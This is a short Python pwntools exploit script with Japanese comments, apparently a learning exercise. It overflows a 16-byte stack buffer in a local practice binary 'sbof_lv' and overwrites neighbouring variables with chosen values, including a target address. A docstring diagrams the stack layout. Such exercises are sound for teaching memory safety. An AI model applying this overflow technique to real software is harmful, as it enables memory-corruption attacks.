#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './sbof_lv'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)

"""
■対象ソースコード
・sbof_lv.c

■脆弱性
・標準入力で、以下のローカル変数に書き込みできるが、nameが16byteしかないため、
  スタックバッファーオーバーフローする。
	char name[0x10]

■スタックのメモリ配置
			┌───────────────────────┐
	-0x30	│					name						│
			├───────────────────────┤
	-0x20	│					secret						│
			├─────┬─────┬───────────┤
	-0x10	│			│	key		│		priv			│
			├─────┴─────┼───────────┤
	rbp		│	saved rbp			│	return 	address		│
			└───────────┴───────────┘
"""

def attack_32_9_11(conn, **kwargs):
    exploit  = b'a' * 0x10						# nameへの書き込み
    exploit += b'H4cked!'.ljust(0x14, b'\x00')	# selectへの書き込み
    exploit += struct.pack('<I', 0xdeadbeef)	# keyへの書き込み
    exploit += struct.pack('<Q', 0x40204b)		# privへの書き込み
    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():
    print('### attack_32_9_11 ###')
    conn = process(bin_file)
    attack_32_9_11(conn)

if __name__=='__main__':
    main()
